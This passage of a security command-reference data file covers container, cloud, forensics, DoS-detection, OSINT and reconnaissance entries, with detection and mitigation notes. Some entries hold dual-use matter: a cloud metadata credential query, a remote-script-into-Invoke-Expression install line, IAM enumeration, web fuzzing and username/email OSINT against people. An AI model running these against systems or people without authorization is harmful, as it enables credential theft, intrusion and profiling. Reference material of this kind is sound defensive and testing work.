 {"id":"ctr-compose","level":"intermediate","cat":"Containers","title":"Docker Compose up / down","desc":"Start or stop a multi-container stack.","tags":["containers"],"code":{"ps":"docker compose up -d   # tear down: docker compose down","mac":"docker compose up -d   # tear down: docker compose down","linux":"docker compose up -d   # tear down: docker compose down"}},
 {"id":"ctr-diff","level":"intermediate","cat":"Containers","title":"Files changed in a container","desc":"Show filesystem changes vs the image — useful in IR to spot tampering.","tags":["containers","incident-response"],"code":{"ps":"docker diff {{NAME:web}}","mac":"docker diff {{NAME:web}}","linux":"docker diff {{NAME:web}}"}},
 {"id":"ctr-history","level":"intermediate","cat":"Containers","title":"Image layer history","desc":"See how an image was built, layer by layer.","tags":["containers"],"code":{"ps":"docker history {{IMAGE:alpine}}","mac":"docker history {{IMAGE:alpine}}","linux":"docker history {{IMAGE:alpine}}"}},
 {"id":"ctr-k8s-get","level":"intermediate","related":["ctr-k8s-logs","ctr-k8s-describe","ctr-k8s-exec"],"cat":"Containers","title":"kubectl: list resources","desc":"List pods/nodes/services across namespaces. Requires kubectl.","tags":["containers"],"code":{"ps":"kubectl get pods -A   # also: nodes, svc, deploy","mac":"kubectl get pods -A   # also: nodes, svc, deploy","linux":"kubectl get pods -A   # also: nodes, svc, deploy"}},
 {"id":"ctr-k8s-logs","level":"intermediate","cat":"Containers","title":"kubectl: pod logs","desc":"Follow logs from a pod.","tags":["containers","logs"],"code":{"ps":"kubectl logs -f {{POD:mypod}} -n {{NS:default}}","mac":"kubectl logs -f {{POD:mypod}} -n {{NS:default}}","linux":"kubectl logs -f {{POD:mypod}} -n {{NS:default}}"}},
 {"id":"ctr-k8s-exec","level":"intermediate","cat":"Containers","title":"kubectl: exec into a pod","desc":"Open a shell in a pod's container.","tags":["containers"],"code":{"ps":"kubectl exec -it {{POD:mypod}} -n {{NS:default}} -- sh","mac":"kubectl exec -it {{POD:mypod}} -n {{NS:default}} -- sh","linux":"kubectl exec -it {{POD:mypod}} -n {{NS:default}} -- sh"}},
 {"id":"ctr-k8s-describe","level":"intermediate","cat":"Containers","title":"kubectl: describe a resource","desc":"Detailed status/events for a pod or other object.","tags":["containers"],"code":{"ps":"kubectl describe pod {{POD:mypod}} -n {{NS:default}}","mac":"kubectl describe pod {{POD:mypod}} -n {{NS:default}}","linux":"kubectl describe pod {{POD:mypod}} -n {{NS:default}}"}},

/* ================= CLOUD CLI ================= */
 {"id":"cld-aws-whoami","level":"intermediate","cat":"Cloud CLI","title":"AWS: who am I","desc":"Show the current AWS caller identity. Requires the aws CLI.","tags":["cloud","account"],"code":{"ps":"aws sts get-caller-identity","mac":"aws sts get-caller-identity","linux":"aws sts get-caller-identity"}},
 {"id":"cld-az-whoami","level":"intermediate","cat":"Cloud CLI","title":"Azure: current account","desc":"Show the active Azure subscription/account. Requires the az CLI.","tags":["cloud","account"],"code":{"ps":"az account show","mac":"az account show","linux":"az account show"}},
 {"id":"cld-gcp-whoami","level":"intermediate","cat":"Cloud CLI","title":"GCP: active identity","desc":"Show authenticated accounts and config. Requires gcloud.","tags":["cloud","account"],"code":{"ps":"gcloud auth list; gcloud config list","mac":"gcloud auth list; gcloud config list","linux":"gcloud auth list; gcloud config list"}},
 {"id":"cld-aws-s3-list","level":"intermediate","cat":"Cloud CLI","title":"AWS: list S3 buckets/objects","desc":"List buckets, or objects within one.","tags":["cloud"],"code":{"ps":"aws s3 ls   # objects: aws s3 ls s3://{{BUCKET:my-bucket}}","mac":"aws s3 ls   # objects: aws s3 ls s3://{{BUCKET:my-bucket}}","linux":"aws s3 ls   # objects: aws s3 ls s3://{{BUCKET:my-bucket}}"}},
 {"id":"cld-aws-s3-public","level":"intermediate","updated":"2026-07","cat":"Cloud CLI","title":"AWS: check bucket public access","desc":"Inspect a bucket's ACL and public-access-block settings.","danger":"Authorized cloud assessments only.","team":"red","tags":["cloud","enumeration"],"attack":["T1580"],"detect":"CloudTrail GetBucketAcl / GetPublicAccessBlock reads, especially from an unusual principal.","mitigate":"Enable S3 Block Public Access org-wide; least-privilege IAM; alert on ACL reads.","code":{"ps":"aws s3api get-bucket-acl --bucket {{BUCKET:my-bucket}}\naws s3api get-public-access-block --bucket {{BUCKET:my-bucket}}","mac":"aws s3api get-bucket-acl --bucket {{BUCKET:my-bucket}}\naws s3api get-public-access-block --bucket {{BUCKET:my-bucket}}","linux":"aws s3api get-bucket-acl --bucket {{BUCKET:my-bucket}}\naws s3api get-public-access-block --bucket {{BUCKET:my-bucket}}"}},
 {"id":"cld-aws-ec2-list","level":"intermediate","cat":"Cloud CLI","title":"AWS: list EC2 instances","desc":"Instance IDs, state, and public IPs.","tags":["cloud","network"],"code":{"ps":"aws ec2 describe-instances --query \"Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress]\" --output table","mac":"aws ec2 describe-instances --query \"Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress]\" --output table","linux":"aws ec2 describe-instances --query \"Reservations[].Instances[].[InstanceId,State.Name,PublicIpAddress]\" --output table"}},
 {"id":"cld-aws-iam-enum","level":"intermediate","updated":"2026-07","cat":"Cloud CLI","title":"AWS: enumerate IAM","desc":"List IAM users and roles.","danger":"Authorized cloud assessments only.","team":"red","tags":["cloud","enumeration","account"],"attack":["T1087.004"],"detect":"CloudTrail ListUsers/ListRoles/ListPolicies from an unusual principal or spike.","mitigate":"Least privilege; deny broad iam:List*; alert on IAM enumeration.","code":{"ps":"aws iam list-users\naws iam list-roles --query \"Roles[].RoleName\"","mac":"aws iam list-users\naws iam list-roles --query \"Roles[].RoleName\"","linux":"aws iam list-users\naws iam list-roles --query \"Roles[].RoleName\""}},
 {"id":"cld-aws-keys","level":"intermediate","cat":"Cloud CLI","title":"AWS: access keys for a user","desc":"List a user's access key IDs and status.","tags":["cloud","account"],"code":{"ps":"aws iam list-access-keys --user-name {{USER:alice}}","mac":"aws iam list-access-keys --user-name {{USER:alice}}","linux":"aws iam list-access-keys --user-name {{USER:alice}}"}},
 {"id":"cld-metadata","level":"intermediate","updated":"2026-07","cat":"Cloud CLI","title":"Cloud instance metadata (IMDS)","desc":"Query the instance metadata service — a common SSRF/credential target.","danger":"Authorized cloud assessments only.","team":"red","tags":["cloud","account"],"attack":["T1552.005"],"detect":"Access to 169.254.169.254 from web/proxy workloads; IMDSv1 usage where v2 is expected.","mitigate":"Enforce IMDSv2 (hop-limit 1); block metadata from containers/reverse proxies.","code":{"ps":"curl -s http://169.254.169.254/latest/meta-data/   # AWS IMDSv1\n# IMDSv2:\nTOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/","mac":"curl -s http://169.254.169.254/latest/meta-data/   # AWS IMDSv1\n# IMDSv2:\nTOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/","linux":"curl -s http://169.254.169.254/latest/meta-data/   # AWS IMDSv1\n# IMDSv2:\nTOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H \"X-aws-ec2-metadata-token-ttl-seconds: 60\")\ncurl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/"}},
 {"id":"cld-az-resources","level":"intermediate","cat":"Cloud CLI","title":"Azure: list resources","desc":"All resources in the current subscription.","tags":["cloud"],"code":{"ps":"az resource list --output table","mac":"az resource list --output table","linux":"az resource list --output table"}},
 {"id":"cld-az-vm-list","level":"intermediate","cat":"Cloud CLI","title":"Azure: list VMs","desc":"Virtual machines with power state.","tags":["cloud","network"],"code":{"ps":"az vm list -d --output table","mac":"az vm list -d --output table","linux":"az vm list -d --output table"}},
 {"id":"cld-gcp-list","level":"intermediate","cat":"Cloud CLI","title":"GCP: projects & instances","desc":"List projects and Compute Engine instances.","tags":["cloud","network"],"code":{"ps":"gcloud projects list\ngcloud compute instances list","mac":"gcloud projects list\ngcloud compute instances list","linux":"gcloud projects list\ngcloud compute instances list"}},
 {"id":"cld-aws-cloudtrail","level":"intermediate","cat":"Cloud CLI","title":"AWS: recent CloudTrail events","desc":"Look up recent management-plane API activity for IR.","team":"blue","tags":["cloud","logs","incident-response"],"code":{"ps":"aws cloudtrail lookup-events --max-results 20 --query \"Events[].[EventTime,Username,EventName]\" --output table","mac":"aws cloudtrail lookup-events --max-results 20 --query \"Events[].[EventTime,Username,EventName]\" --output table","linux":"aws cloudtrail lookup-events --max-results 20 --query \"Events[].[EventTime,Username,EventName]\" --output table"}},
 {"id":"cld-aws-logs","level":"intermediate","cat":"Cloud CLI","title":"AWS: tail CloudWatch logs","desc":"Follow a log group live.","team":"blue","tags":["cloud","logs"],"code":{"ps":"aws logs tail {{GROUP:/aws/lambda/myfn}} --follow","mac":"aws logs tail {{GROUP:/aws/lambda/myfn}} --follow","linux":"aws logs tail {{GROUP:/aws/lambda/myfn}} --follow"}},
 {"id":"cld-az-activity","level":"intermediate","cat":"Cloud CLI","title":"Azure: activity log","desc":"Recent subscription activity for auditing/IR.","team":"blue","tags":["cloud","logs","incident-response"],"code":{"ps":"az monitor activity-log list --max-events 20 --output table","mac":"az monitor activity-log list --max-events 20 --output table","linux":"az monitor activity-log list --max-events 20 --output table"}},
 {"id":"for-extract-ipv4","level":"intermediate","cat":"Forensics","title":"Extract IPv4 addresses from text files -> CSV","desc":"Regex-scan every .txt in a folder for IPv4 addresses and export the unique results (with source filename) to a CSV.","danger":"Writes the output CSV to the working directory (overwrites an existing file of that name).","tags":["forensics","regex","network"],"code":{"ps":"$pattern = '\\b(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\b'\n\n$result = foreach ($file in Get-ChildItem -Path {{PATH:.}} -Filter *.txt) {\n    Select-String -Path $file.FullName -Pattern $pattern -AllMatches | ForEach-Object {\n        foreach ($match in $_.Matches) {\n            [PSCustomObject]@{\n                File = $file.Name\n                IP   = $match.Value\n            }\n        }\n    }\n}\n\n$result | Sort-Object IP -Unique | Export-Csv \"{{OUTPUT:IPs_With_Files.csv}}\" -NoTypeInformation\n\nWrite-Host \"Results saved to {{OUTPUT:IPs_With_Files.csv}}\""}},
 {"id":"for-extract-ipv4-json","level":"intermediate","cat":"Forensics","title":"Extract IPv4 addresses from JSON files -> list","desc":"Regex-scan every .json in a folder for IPv4 addresses and save the unique addresses to a text file.","danger":"Writes the output text file to the working directory (overwrites an existing file of that name).","tags":["forensics","regex","network"],"code":{"ps":"# IPv4 regular expression\n$Pattern = '\\b(?:(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)\\b'\n\n# Extract IPs from all JSON files in the folder\n$IPs = Get-ChildItem -Path {{PATH:.}} -Filter *.json |\n    Select-String -Pattern $Pattern -AllMatches |\n    ForEach-Object { $_.Matches.Value } |\n    Sort-Object -Unique\n\n# Save the results\n$IPs | Set-Content \"{{OUTPUT:Extracted_IPs.txt}}\"\n\nWrite-Host \"Found $($IPs.Count) unique IPv4 addresses.\"\nWrite-Host \"Results saved to {{OUTPUT:Extracted_IPs.txt}}\""}},
 {"id":"for-dd-image","level":"intermediate","requires":{"elevation":true},"cat":"Forensics","team":"blue","title":"Forensic disk/partition image (dd)","desc":"Create a byte-for-byte raw image of a disk or partition with dd, then hash it to prove integrity. Work from a write-blocked source and write to separate media.","danger":"Runs as root against raw devices; a wrong 'of=' target overwrites data irrecoverably. Verify source vs destination before running.","tags":["forensics","recovery"],"code":{"linux":"# image a disk, keep reading past bad sectors, show progress:\nsudo dd if={{SRC:/dev/sdb}} of={{OUT:disk.img}} bs=4M conv=noerror,sync status=progress\nsha256sum {{OUT:disk.img}} | tee disk.img.sha256","mac":"# macOS: list disks with 'diskutil list'; raw rdiskN is faster\nsudo dd if={{SRC:/dev/rdisk2}} of={{OUT:disk.img}} bs=4m\nshasum -a 256 {{OUT:disk.img}} | tee disk.img.sha256"}},
 {"id":"for-memdump","level":"intermediate","requires":{"elevation":true},"cat":"Forensics","team":"blue","title":"Capture RAM (memdump / AVML)","desc":"Acquire volatile memory to a file for offline analysis (Volatility, strings). memdump reads /dev/mem and is often blocked on hardened kernels - AVML is the reliable modern option. Save to external media.","danger":"Requires root. Capture to a separate disk/USB so you don't overwrite unallocated space; acquisition itself perturbs memory.","tags":["forensics","memory"],"code":{"linux":"# classic memdump (may be blocked by kernel lockdown):\nsudo memdump > {{OUT:mem.dump}}\n# reliable on modern kernels (Microsoft AVML, static binary):\nsudo ./avml {{OUT:mem.lime}}\n# Windows: WinPmem or DumpIt   macOS: AVML"}},
 {"id":"tool-winhex","level":"intermediate","updated":"2026-07","cat":"Forensics","title":"WinHex (X-Ways) - hex, disk & RAM editor","desc":"Universal hex editor and disk/RAM editor built for computer forensics and data recovery: inspect and edit files, disks, and memory, interpret file systems, and carve/recover data. Runs in a reduced evaluation mode until licensed.","url":"https://www.x-ways.net/winhex/","license":"Proprietary (X-Ways; free evaluation, tiered paid licenses)","platforms":["windows"],"tags":["forensics","recovery"],"install":{"cmd":"winget install X-Ways.WinHex"}},
 {"id":"tool-winutil","requires":{"elevation":true},"updated":"2026-07","cat":"Tools","title":"WinUtil - Windows debloat & tweaks (Chris Titus Tech)","desc":"Open-source PowerShell GUI to debloat Windows, apply tweaks, and install apps. Launch from an ELEVATED PowerShell.","danger":"Pipes a remote script straight into Invoke-Expression and makes system changes - review the source (github.com/ChrisTitusTech/winutil) before running; run elevated.","url":"https://github.com/ChrisTitusTech/winutil","license":"MIT","platforms":["windows"],"tags":["windows","automation"],"install":{"cmd":"irm christitus.com/win | iex"}},

/* --- DoS detection & mitigation (added) --- */
 {"id":"det-dos-synflood","level":"intermediate","requires":{"elevation":true},"cat":"Detection Engineering","title":"Detect & mitigate SYN flood","desc":"Spot and blunt a TCP SYN flood (half-open connection exhaustion).","danger":"Mitigation changes kernel/firewall settings; run elevated.","team":"blue","tags":["detection","network"],"attack":["T1498"],"detect":"Many connections stuck in SYN_RECV; SYN rate far exceeds completed handshakes; one or spoofed sources hammering a port.","mitigate":"Enable SYN cookies; raise the SYN backlog; rate-limit new SYNs at the firewall; front with upstream scrubbing/CDN.","code":{"linux":"# --- detect ---\nss -s | grep -i syn                     # summary counters\nss -tan state syn-recv | wc -l          # count half-open connections\nsudo tcpdump -ni {{IFACE:eth0}} 'tcp[tcpflags] == tcp-syn' -c 50\n# --- mitigate (root) ---\nsudo sysctl -w net.ipv4.tcp_syncookies=1\nsudo sysctl -w net.ipv4.tcp_max_syn_backlog=4096\nsudo nft add rule inet filter input tcp flags syn limit rate 50/second accept","ps":"# --- detect ---\n(Get-NetTCPConnection -State SynReceived -ErrorAction SilentlyContinue).Count\nnetstat -ano -p tcp | Select-String \"SYN_RECEIVED\" | Measure-Object\n# --- mitigate ---\n# Ensure firewall/edge connection rate-limits are set; front with a DDoS-scrubbing service."}},
 {"id":"det-dos-udpflood","level":"intermediate","requires":{"elevation":true},"cat":"Detection Engineering","title":"Detect & mitigate UDP flood","desc":"Spot and rate-limit a UDP flood saturating a host or link.","danger":"Mitigation changes firewall settings; run elevated.","team":"blue","tags":["detection","network"],"attack":["T1498"],"detect":"UDP packets-per-second / bandwidth spike toward a host or port; bursts of ICMP port-unreachable replies from the victim.","mitigate":"Rate-limit or drop unneeded UDP at the edge; add capacity; use upstream scrubbing for volumetric attacks.","code":{"linux":"# --- detect ---\nsudo tcpdump -ni {{IFACE:eth0}} udp -c 50\nss -u -a | wc -l\nsudo iftop -i {{IFACE:eth0}} 2>/dev/null    # per-host bandwidth (dep: iftop)\n# --- mitigate (root) ---\nsudo nft add rule inet filter input udp limit rate over 100/second drop"}},
 {"id":"det-dos-icmpflood","level":"intermediate","requires":{"elevation":true},"cat":"Detection Engineering","title":"Detect & mitigate ICMP (ping) flood","desc":"Spot and rate-limit an ICMP echo flood (incl. oversized pings).","danger":"Mitigation limits/drops ICMP; run elevated. Don't fully block ICMP (breaks path-MTU discovery).","team":"blue","tags":["detection","network"],"attack":["T1498"],"detect":"High ICMP echo-request rate, often oversized/fragmented packets, from one or many sources.","mitigate":"Rate-limit ICMP at the edge; ignore broadcast echo (smurf); drop oversized pings — but keep enough ICMP for PMTUD.","code":{"linux":"# --- detect ---\nsudo tcpdump -ni {{IFACE:eth0}} icmp -c 50\n# --- mitigate (root) ---\nsudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1\nsudo nft add rule inet filter input icmp type echo-request limit rate over 20/second drop"}},
 {"id":"det-dos-slowloris","level":"intermediate","cat":"Detection Engineering","title":"Detect & mitigate Slowloris / slow-HTTP","desc":"Spot and defend against slow-HTTP DoS that holds many partial connections open. (Technique PoC: github.com/gkbrk/slowloris.)","danger":"Mitigation changes web-server config; test before applying in production.","team":"blue","tags":["detection","web"],"attack":["T1499.002"],"detect":"Many concurrent connections from a few client IPs held open with partial/slow requests; high connection count but low request throughput; web workers stuck in the reading state.","mitigate":"Set aggressive header/body read timeouts and per-IP connection limits; use Apache mod_reqtimeout / nginx limit_conn; front with a reverse proxy or CDN.","code":{"linux":"# --- detect: connections per client IP to the web ports ---\nss -tan '( dport = :80 or dport = :443 )' | awk 'NR>1{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head\n# Apache scoreboard: workers stuck in R (Reading):\napachectl fullstatus 2>/dev/null | grep -iE 'reading|requests currently'\n# --- mitigate ---\n# nginx:  limit_conn_zone $binary_remote_addr zone=perip:10m;  limit_conn perip 20;\n#         client_header_timeout 5s;  client_body_timeout 5s;\n# Apache: enable mod_reqtimeout ->  RequestReadTimeout header=5 body=10"}},
 {"id":"tool-hping3","updated":"2026-07","cat":"Tools","title":"hping3 - TCP/IP packet crafter","desc":"Craft custom TCP/UDP/ICMP/raw-IP packets for firewall/ACL testing, port probing, path-MTU discovery, and traceroute. Dual-use: also abusable for network floods (see the DoS detection entries).","url":"https://github.com/antirez/hping","license":"GPLv2","platforms":["linux","macos"],"tags":["network","tools"],"attack":["T1498"],"install":{"linux":"sudo apt install hping3"}},

/* --- tool install + usage (added) --- */
 {"id":"osint-maigret","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Maigret - username OSINT (2500+ sites)","desc":"Find accounts tied to a username across thousands of sites. Requires Python (pipx recommended).","danger":"OSINT - scope to authorized engagements; queries third-party sites, not the target.","team":"red","tags":["osint","account"],"attack":["T1593.001"],"detect":"Passive - invisible to the target; reduce exposure by not reusing sensitive usernames.","mitigate":"Use distinct handles for sensitive accounts; monitor for impersonation.","code":{"linux":"pipx install maigret   # or: pip install maigret\nmaigret {{USERNAME:johndoe}}","mac":"pipx install maigret\nmaigret {{USERNAME:johndoe}}","ps":"pip install maigret\nmaigret {{USERNAME:johndoe}}"}},
 {"id":"osint-holehe","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Holehe - email account discovery","desc":"Check which sites an email is registered on via signup/reset responses. Requires Python.","danger":"OSINT - authorized engagements only; queries third-party sites.","team":"red","tags":["osint","mail","account"],"attack":["T1589.002"],"detect":"Passive to the target; the queried sites may log password-reset probes.","mitigate":"Limit public exposure of employee emails; user awareness.","code":{"linux":"pipx install holehe\nholehe {{EMAIL:target@example.com}}","mac":"pipx install holehe\nholehe {{EMAIL:target@example.com}}","ps":"pip install holehe\nholehe {{EMAIL:target@example.com}}"}},
 {"id":"osint-blackbird","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Blackbird - username/email OSINT","desc":"Search a username or email across many sites. Clone from GitHub; requires Python.","danger":"OSINT - authorized engagements only.","team":"red","tags":["osint","account"],"attack":["T1593.001"],"detect":"Passive - invisible to the target.","mitigate":"Use distinct handles; minimize public footprint.","code":{"linux":"git clone https://github.com/p1ngul1n0/blackbird\ncd blackbird && pip install -r requirements.txt\npython blackbird.py -u {{USERNAME:johndoe}}","mac":"git clone https://github.com/p1ngul1n0/blackbird\ncd blackbird && pip install -r requirements.txt\npython3 blackbird.py -u {{USERNAME:johndoe}}"}},
 {"id":"web-seclists","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Web App Testing","title":"SecLists - wordlist collection","desc":"The tester's companion: wordlists for discovery, fuzzing, passwords, and payloads. Install once, point your tools at it.","danger":"Authorized testing only.","team":"red","tags":["web","password","scanning"],"attack":["T1595.003"],"detect":"The tool USING these lists is what's detectable (404/403 floods), not the lists.","mitigate":"Rate-limit; WAF; monitor content-discovery patterns.","code":{"linux":"sudo apt install seclists 2>/dev/null || git clone https://github.com/danielmiessler/SecLists /usr/share/seclists\n# example use with ffuf:\nffuf -u http://{{TARGET:10.0.0.5}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt","mac":"brew install seclists 2>/dev/null || git clone https://github.com/danielmiessler/SecLists\nffuf -u http://{{TARGET:10.0.0.5}}/FUZZ -w SecLists/Discovery/Web-Content/common.txt"}},
 {"id":"recon-nmap-vulners","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Reconnaissance","title":"nmap-vulners - CVE detection NSE","desc":"nmap NSE script mapping detected service versions to known CVEs (Vulners DB). Requires nmap + internet.","danger":"Authorized targets only; active version/vuln scan.","team":"red","tags":["recon","scanning","detection"],"attack":["T1595.002"],"detect":"Version probes plus outbound lookups to vulners.com; IDS vuln-scan signatures.","mitigate":"Patch; virtual-patch at a WAF; alert on scanner signatures.","code":{"linux":"sudo git clone https://github.com/vulnersCom/nmap-vulners /usr/share/nmap/scripts/nmap-vulners\nsudo nmap --script-updatedb\nnmap -sV --script vulners {{TARGET:10.0.0.5}}","mac":"git clone https://github.com/vulnersCom/nmap-vulners \"$(brew --prefix)/share/nmap/scripts/nmap-vulners\"\nnmap -sV --script vulners {{TARGET:10.0.0.5}}"}},
 {"id":"recon-sn1per","level":"intermediate","requires":{"elevation":true},"updated":"2026-07","cat":"Reconnaissance","title":"Sn1per - automated recon framework","desc":"Orchestrates many tools to automate recon/enumeration. Aggressive - authorized scopes only. Requires git + Linux.","danger":"High-volume automated scanning; authorized engagements only. Run from a lab/VM.","team":"red","tags":["recon","scanning","enumeration"],"attack":["T1595"],"detect":"Bursts of many tools' traffic from one source; IDS multi-signature scan alerts.","mitigate":"Rate-limit; segment; alert on multi-vector scanning from a single host.","code":{"linux":"git clone https://github.com/1N3/Sn1per\ncd Sn1per && sudo bash install.sh\n# basic recon on ONE authorized target:\nsniper -t {{TARGET:example.com}} -m stealth"}},
 {"id":"rmt-tacticalrmm","level":"beginner","cat":"Remote Management","title":"Tactical RMM - self-hosted RMM","desc":"Open-source remote monitoring & management (agents, scripts, alerts) for fleets. Self-hosted server, not a run-in-place CLI. Note: RMM tools are also abused by attackers for persistence (worth detecting).","team":"blue","tags":["remote","automation"],"code":{"linux":"# Deploy on a FRESH Ubuntu LTS server (or Docker). Review the installer first:\nwget https://raw.githubusercontent.com/amidaware/tacticalrmm/master/install.sh\n# then follow docs.tacticalrmm.com  ->  sudo bash install.sh"}},
 {"id":"tool-shodan","updated":"2026-07","cat":"Tools","title":"Shodan CLI","desc":"Search engine for internet-exposed devices/services, with a CLI and Python API. Passive external attack-surface recon.","url":"https://github.com/achillean/shodan-python","license":"MIT","platforms":["windows","macos","linux"],"tags":["osint","network","tools"],"attack":["T1596.005"],"install":{"cmd":"pip install shodan","mac":"pip3 install shodan","linux":"pip3 install shodan"}},
 {"id":"osint-shodan-cli","level":"intermediate","updated":"2026-07","cat":"OSINT","title":"Shodan CLI - setup & common queries","desc":"Install the Shodan CLI, set your API key, and run the everyday lookups. Requires a Shodan account/API key.","danger":"OSINT - authorized engagements only; reads a third-party database, not the target.","team":"red","tags":["osint","network"],"attack":["T1596.005"],"detect":"Passive - invisible to the target; monitor your OWN external surface for exposure instead.","mitigate":"Reduce internet-exposed services; request removal; continuous EASM monitoring.","code":{"linux":"pip install shodan\nshodan init {{APIKEY:YOUR_API_KEY}}\nshodan host {{IP:1.1.1.1}}\nshodan search --fields ip_str,port,org \"{{QUERY:apache}}\"\nshodan count \"{{QUERY:apache}}\"\nshodan domain {{DOMAIN:example.com}}\nshodan myip","mac":"pip3 install shodan\nshodan init {{APIKEY:YOUR_API_KEY}}\nshodan host {{IP:1.1.1.1}}\nshodan search --fields ip_str,port,org \"{{QUERY:apache}}\"\nshodan domain {{DOMAIN:example.com}}","ps":"pip install shodan\nshodan init {{APIKEY:YOUR_API_KEY}}\nshodan host {{IP:1.1.1.1}}\nshodan search --fields ip_str,port,org \"{{QUERY:apache}}\""}},
 {"id":"tool-netdiscover","updated":"2026-07","cat":"Tools","title":"netdiscover","desc":"Active/passive ARP reconnaissance to find live hosts on a local segment.","url":"https://www.kali.org/tools/netdiscover/","license":"open source","platforms":["linux"],"tags":["recon","network","tools"],"steps":[{"title":"Listen passively for hosts","cmd":"sudo netdiscover -p -i {{IFACE:eth0}}","note":"-p is passive mode: it sends nothing and just watches ARP traffic on the segment, so it's stealthy but only sees hosts that happen to talk. Good when you don't want to be noticed."},{"title":"Actively ARP-scan the local segment","cmd":"sudo netdiscover -i {{IFACE:eth0}}","note":"With no range given, netdiscover auto-detects and actively ARP-scans your local /24, which is faster and finds quiet hosts that passive mode would miss."},{"title":"Scan a specific range","cmd":"sudo netdiscover -r {{RANGE:10.0.0.0/24}}","note":"-r targets a CIDR you choose. ARP works only on the local link, so this is for the network segment you're actually attached to."},{"title":"Produce script-friendly output","cmd":"sudo netdiscover -r {{RANGE:10.0.0.0/24}} -P -N","optional":true,"note":"-P prints a plain parsable table and -N drops the header, so you can pipe the discovered IP/MAC pairs straight into other tools."}],"install":{"linux":"sudo apt install netdiscover"}},
 {"id":"tool-fping","updated":"2026-07","cat":"Tools","title":"fping","desc":"Parallel ICMP sweeper that pings many hosts at once and reports which are alive.","url":"https://www.kali.org/tools/fping/","license":"open source","platforms":["linux","macos"],"tags":["recon","network","tools"],"steps":[{"title":"Sweep a subnet for live hosts","cmd":"fping -a -g {{RANGE:10.0.0.0/24}} 2>/dev/null","note":"-g generates the address range and -a prints only the hosts that answer; redirecting stderr hides the flood of 'unreachable' lines. Much faster than ping because it probes many hosts in parallel."},{"title":"Ping a list of targets from a file","cmd":"fping -a -f hosts.txt 2>/dev/null","note":"-f reads one host or IP per line — handy when you already have a target list and just want to know which are up right now."},{"title":"Save the alive list for the next tool","cmd":"fping -a -g {{RANGE:10.0.0.0/24}} 2>/dev/null > live.txt","note":"Capture just the responsive hosts, then feed them straight into a detailed scan: 'nmap -sV -iL live.txt'. This keeps slow scans focused only on hosts that exist."},{"title":"Tune speed and reliability","cmd":"fping -a -g {{RANGE:10.0.0.0/24}} -r 1 -i 10 2>/dev/null","optional":true,"note":"-r sets retries and -i the milliseconds between probes. Fewer retries and a small interval is faster but can miss hosts on a lossy network; raise them for accuracy."}],"install":{"linux":"sudo apt install fping","mac":"brew install fping"}},
 {"id":"tool-dnsrecon","updated":"2026-07","cat":"Tools","title":"dnsrecon","desc":"DNS enumeration tool: records, zone transfers, brute force, and reverse lookups.","url":"https://www.kali.org/tools/dnsrecon/","license":"open source","platforms":["linux"],"tags":["recon","dns","tools"],"steps":[{"title":"Pull the standard DNS records","cmd":"dnsrecon -d {{DOMAIN:example.com}}","note":"The default run enumerates A, AAAA, MX, NS, SOA, TXT, and SRV records — a quick picture of a domain's mail, name servers, and published services."},{"title":"Try a zone transfer","cmd":"dnsrecon -d {{DOMAIN:example.com}} -t axfr","note":"-t axfr asks each name server for the entire zone. Most refuse, but a misconfigured server hands over every record at once, which is a significant finding."},{"title":"Brute-force subdomains","cmd":"dnsrecon -d {{DOMAIN:example.com}} -D {{WORDLIST:/usr/share/wordlists/dnsmap.txt}} -t brt","note":"-t brt resolves names from a wordlist against the domain, surfacing hosts (dev, vpn, staging) that aren't in any public listing."},{"title":"Reverse-lookup an IP range","cmd":"dnsrecon -r {{RANGE:10.0.0.0/24}}","optional":true,"note":"-r runs PTR lookups across a CIDR to map addresses back to hostnames, which often reveals naming conventions and related infrastructure."},{"title":"Save the results","cmd":"dnsrecon -d {{DOMAIN:example.com}} --json out.json","optional":true,"note":"--json (also --xml, --csv) writes structured output you can keep for reporting or parse into a follow-up target list."}],"install":{"linux":"sudo apt install dnsrecon"}},
 {"id":"tool-dnsenum","updated":"2026-07","cat":"Tools","title":"dnsenum","desc":"Enumerate DNS info: hosts, records, MX, zone transfers, and subdomain brute force.","url":"https://www.kali.org/tools/dnsenum/","license":"open source","platforms":["linux"],"tags":["recon","dns","subdomain","tools"],"steps":[{"title":"Run a full enumeration","cmd":"dnsenum {{DOMAIN:example.com}}","note":"One command gathers records, attempts a zone transfer, brute-forces subdomains, and does reverse lookups — a thorough first pass over a domain's DNS."},{"title":"Brute with a chosen wordlist","cmd":"dnsenum -f {{WORDLIST:/usr/share/wordlists/dnsmap.txt}} {{DOMAIN:example.com}}","note":"-f sets the subdomain wordlist. A larger, target-relevant list finds more hosts at the cost of time and DNS noise."},{"title":"Save output and add threads","cmd":"dnsenum --threads 10 -o out.xml {{DOMAIN:example.com}}","optional":true,"note":"--threads speeds up the brute force and -o writes an XML report you can archive or import elsewhere."},{"title":"Skip the reverse sweep for speed","cmd":"dnsenum --noreverse {{DOMAIN:example.com}}","optional":true,"note":"--noreverse drops the PTR lookups when you only care about forward records and want a faster run."}],"install":{"linux":"sudo apt install dnsenum"}},
